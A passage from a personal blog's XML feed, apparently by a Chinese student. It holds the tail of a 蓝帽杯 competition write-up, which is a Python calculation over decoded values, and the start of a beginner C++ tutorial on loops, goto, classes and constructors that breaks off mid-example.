&#x27;lJdxlGpn&#x27;], [&#x27;lpVvlHFu&#x27;, &#x27;lJhvmHBn&#x27;, &#x27;l5xunGtv&#x27;, &#x27;lZRul2pt&#x27;, &#x27;mpdqnGxu&#x27;, &#x27;l5Zxlmho&#x27;, &#x27;lJppmWhq&#x27;, &#x27;nJVylWpp&#x27;, &#x27;m5VxnWlr&#x27;], [&#x27;lpdsnGtq&#x27;, &#x27;mZ1tnGpt&#x27;, &#x27;mJVqmmtq&#x27;, &#x27;l5hslWhm&#x27;, &#x27;lZZtl21r&#x27;, &#x27;nJlumGlm&#x27;, &#x27;lJhsmW9t&#x27;], [&#x27;lZZym25s&#x27;, &#x27;l5tpnHBt&#x27;, &#x27;nJVunG1q&#x27;, &#x27;mJdtlHFu&#x27;, &#x27;mpVtlnFp&#x27;, &#x27;mplrnG1t&#x27;, &#x27;mJ1ylHBr&#x27;, &#x27;nJhynG5m&#x27;, &#x27;mplymG1r&#x27;], [&#x27;lJtxlGxo&#x27;, &#x27;lpRxnGlm&#x27;, &#x27;mZxwnG5s&#x27;, &#x27;mZptnWpn&#x27;, &#x27;mJZylGxq&#x27;, &#x27;mZZvm3Fo&#x27;], [&#x27;lJdxnW9t&#x27;, &#x27;lZtxmXFv&#x27;, &#x27;nJxtlXFm&#x27;, &#x27;mJZumW1r&#x27;, &#x27;nJ1tmG1p&#x27;, &#x27;mplslmpu&#x27;, &#x27;lJZxlG5p&#x27;, &#x27;nJtxmXBq&#x27;], [&#x27;lZdxmmtq&#x27;, &#x27;lJdrlG1o&#x27;, &#x27;mpZtmmlm&#x27;, &#x27;mJVxnGpm&#x27;, &#x27;mJVwmWxu&#x27;, &#x27;mplslWps&#x27;]]a = [0.04, 0.06, 0.05, 0.07, 0.10, 0.15, 0.17, 0.23, 0.22, 0.25, 0.29, 0.20, 0.28, 0.33, 0.35, 0.35, 0.37]s = []for i in range(len(a1)):    ss = 0 for j in range(len(a1[i])):        ss += decryp(a1[i][j].encode())    s.append(ss * a[i])print(s)print(sum(s))#15758353.760000002</span><br></pre></td></tr></table></figure>

<p>保留两位，提交15758353.76</p>
]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>蓝帽杯</tag>
        <tag>wp</tag>
        <tag>校队</tag>
      </tags>
  </entry>
  <entry>
    <title>C艹从入门到入土</title>
    <url>/2022/02/10/C%E8%89%B9%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</url>
    <content><![CDATA[<h3 id="一、入门"><a href="#一、入门" class="headerlink" title="一、入门"></a>一、入门</h3><p>国际惯例，输出<code>hello world</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">    cin &gt;&gt; name;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your name is:&quot;</span>&lt;&lt;name&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于学过c，所以相同的东西就不过多赘述了</p>
<span id="more"></span>

<h4 id="1-for循环练习"><a href="#1-for循环练习" class="headerlink" title="1.for循环练习"></a>1.for循环练习</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= <span class="number">100</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">7</span> == <span class="number">0</span> || i % <span class="number">10</span> == <span class="number">7</span> || (i / <span class="number">10</span> ) % <span class="number">10</span> == <span class="number">7</span>)&#123;</span><br><span class="line">            cout &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-跳转语句之goto语句"><a href="#2-跳转语句之goto语句" class="headerlink" title="2.跳转语句之goto语句"></a>2.跳转语句之goto语句</h4><p>（不怎么使用</p>
<p><strong>作用：</strong>无条件跳转语句</p>
<p><strong>语法：</strong><code>goto 标记;</code></p>
<p><strong>解释：</strong>如果标记的名称存在，执行到goto语句时，会跳转到标记的位置</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;1 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;2 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;3 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    <span class="keyword">goto</span> FLAG;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;4 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;5 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    FLAG:</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;6 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;7 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二、类和对象"><a href="#二、类和对象" class="headerlink" title="二、类和对象"></a>二、类和对象</h3><h4 id="2-1-封装"><a href="#2-1-封装" class="headerlink" title="2.1 封装"></a>2.1 封装</h4><p>将属性和行为作为一个整体，表现生活中的事物并对属性和行为加以权限控制。</p>
<p>语法：<code>class ClassName&#123; &#125;;</code></p>
<p>实例1：设计一个圆类，求圆的面积</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PI 3.14</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CircleController</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">calculation</span><span class="params">(<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> PI * r * r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r = <span class="number">10</span>;</span><br><span class="line">    CircleController c1;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;圆的面积为：&quot;</span> &lt;&lt; c1.<span class="built_in">calculation</span>(r) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实例2：Student类</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    string name  = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> id = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 获取信息</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setInfot</span><span class="params">(string name,<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">        <span class="keyword">this</span>-&gt;id = id;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 输出信息</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printInfor</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;your name:&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt; <span class="string">&quot; and your id:&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;id &lt;&lt; endl;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Student s1;</span><br><span class="line">    string name;</span><br><span class="line">    <span class="keyword">int</span> id = <span class="number">1</span>;</span><br><span class="line">    cin &gt;&gt; name;</span><br><span class="line">    cin &gt;&gt; id;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your name:&quot;</span> &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your id:&quot;</span> &lt;&lt; id &lt;&lt; endl;</span><br><span class="line">    s1.<span class="built_in">setInfot</span>(name,id);</span><br><span class="line">    s1.<span class="built_in">printInfor</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问权限有，Class的默认权限是<code>private</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">公共权限 public</span><br><span class="line">保护权限 protected</span><br><span class="line">私有权限 private</span><br></pre></td></tr></table></figure>

<p>案例3：设计立方体类（Cube）</p>
<p>求出立方体的面积和体积，分别用全局函数和成员函数判断两个立方体是否相等</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cube</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    <span class="keyword">double</span> m_L;</span><br><span class="line">    <span class="keyword">double</span> m_W;</span><br><span class="line">    <span class="keyword">double</span> m_H;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getL</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_L;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getW</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_W;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getH</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_H;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">measure</span><span class="params">(Cube c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(m_L == c.<span class="built_in">getL</span>() &amp;&amp; m_W == c.<span class="built_in">getW</span>() &amp;&amp; m_H == c.<span class="built_in">getH</span>())&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;no&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setData</span><span class="params">(<span class="keyword">double</span> L,<span class="keyword">double</span> W,<span class="keyword">double</span> H)</span></span>&#123;</span><br><span class="line">        m_L = L;</span><br><span class="line">        m_W = W;</span><br><span class="line">        m_H = H;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getVolume</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_L * m_W * m_H;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getArea</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * (m_L * m_W + m_W * m_H + m_L * m_H);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Measure</span><span class="params">(Cube c1,Cube c2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(c1.<span class="built_in">getL</span>() == c2.<span class="built_in">getL</span>() &amp;&amp; c1.<span class="built_in">getW</span>() == c2.<span class="built_in">getW</span>() &amp;&amp; c1.<span class="built_in">getH</span>() == c2.<span class="built_in">getH</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;no&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Cube c1;</span><br><span class="line">    Cube c2;</span><br><span class="line">    c1.<span class="built_in">setData</span>(<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">    c2.<span class="built_in">setData</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">    c1.<span class="built_in">measure</span>(c2);</span><br><span class="line">    <span class="built_in">Measure</span>(c1,c2);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your volume:&quot;</span> &lt;&lt; c1.<span class="built_in">getVolume</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your area:&quot;</span> &lt;&lt; c1.<span class="built_in">getArea</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>案例4：点和圆之间的关系</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setPoint</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;x = x;</span><br><span class="line">        <span class="keyword">this</span>-&gt;y = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getX</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getY</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    Point p;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setR</span><span class="params">(<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;r = r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setCenter</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">        p.<span class="built_in">setPoint</span>(x,y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getR</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getCenterX</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> p.<span class="built_in">getX</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getCenterY</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> p.<span class="built_in">getY</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">measure</span><span class="params">(Circle c,Point p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res;</span><br><span class="line">    res = <span class="built_in">sqrt</span>((c.<span class="built_in">getCenterX</span>() - p.<span class="built_in">getX</span>()) * (c.<span class="built_in">getCenterX</span>() - p.<span class="built_in">getX</span>()) + (c.<span class="built_in">getCenterY</span>() - p.<span class="built_in">getY</span>()) * (c.<span class="built_in">getCenterY</span>() - p.<span class="built_in">getY</span>()));</span><br><span class="line">    <span class="keyword">if</span>(res == c.<span class="built_in">getR</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the point on the circle&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(res &gt; c.<span class="built_in">getR</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the point out the circle&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the point in the circle&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Circle c;</span><br><span class="line">    c.<span class="built_in">setR</span>(<span class="number">10</span>);</span><br><span class="line">    c.<span class="built_in">setCenter</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    Point p;</span><br><span class="line">    p.<span class="built_in">setPoint</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">measure</span>(c,p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-2-对象的初始化和清理"><a href="#2-2-对象的初始化和清理" class="headerlink" title="2.2 对象的初始化和清理"></a>2.2 对象的初始化和清理</h4><p>构造函数和析构函数</p>
<ul>
<li><p>构造函数：主要作用在于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用；</p>
</li>
<li><p>析构函数：主要作用在于对象销毁前系统自动调用，执行一些清理工作。</p>
</li>
</ul>
<p>实例1：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    string name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>();</span><br><span class="line">    ~<span class="built_in">Person</span>();</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setName</span><span class="params">(string name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;your name:&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; your age:&quot;</span> &lt;&lt; age &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Person::<span class="built_in">Person</span>()</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;contruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person::~<span class="built_in">Person</span>()</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;BYE!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p1;</span><br><span class="line">    p1.<span class="built_in">setName</span>(<span class="string">&quot;Ameuu&quot;</span>);</span><br><span class="line">    p1.<span class="built_in">print</span>();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>构造函数的分类及调用</strong></p>
<p>分类：</p>
<p>​    按参数分类：有参、无参</p>
<p>​    按类型分类：普通、拷贝</p>
<p>调用：</p>
<p>​    括号法、显示法、隐式转换法</p>
<p>示例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1.构造函数的分类及调用</span></span><br><span class="line"><span class="comment"> * 分类：有参 无参/ 普通 拷贝</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    string name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;contruct funtion&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;destruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 有参构造函数</span></span><br><span class="line">    <span class="built_in">Person</span>(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the contrust funtion include args&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拷贝构造函数</span></span><br><span class="line">    <span class="built_in">Person</span>(<span class="keyword">const</span> Person &amp;p)&#123;</span><br><span class="line">        <span class="comment">//将传入的类的所有属性拷贝到本类身上</span></span><br><span class="line">        age = p.age;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;copy contruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 括号法</span></span><br><span class="line">    <span class="comment">// Person p1; </span></span><br><span class="line">    <span class="comment">// Person p2(10);</span></span><br><span class="line">    <span class="comment">// Person p3(p2);</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; &quot;*****************************&quot; &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示</span></span><br><span class="line">    <span class="comment">// Person p1;</span></span><br><span class="line">    <span class="comment">// Person p2 = Person(10);</span></span><br><span class="line">    <span class="comment">// Person p3 = Person(p2);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Person(10); // 匿名对象 当前行执行结束之后，系统立即回收</span></span><br><span class="line">    <span class="comment">// // 注意：不能利用拷贝构造函数初始化匿名对象</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; &quot;*****************************&quot; &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 隐式转换</span></span><br><span class="line">    Person p1 = <span class="number">10</span>;</span><br><span class="line">    Person p2 = p1;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>拷贝构造函数的调用</strong></p>
<p>​    1.使用一个创建完毕的对象来初始化一个新对象</p>
<p>​    2.值传递的方式给函数参数传值</p>
<p>​    3.值方式返回局部对象</p>
<p>示例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;contruct funtion&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;destruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Person</span>(<span class="keyword">const</span> Person &amp;p)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;copy contruct funtion&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(Person p)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Person <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p;</span><br><span class="line">    <span class="keyword">return</span> 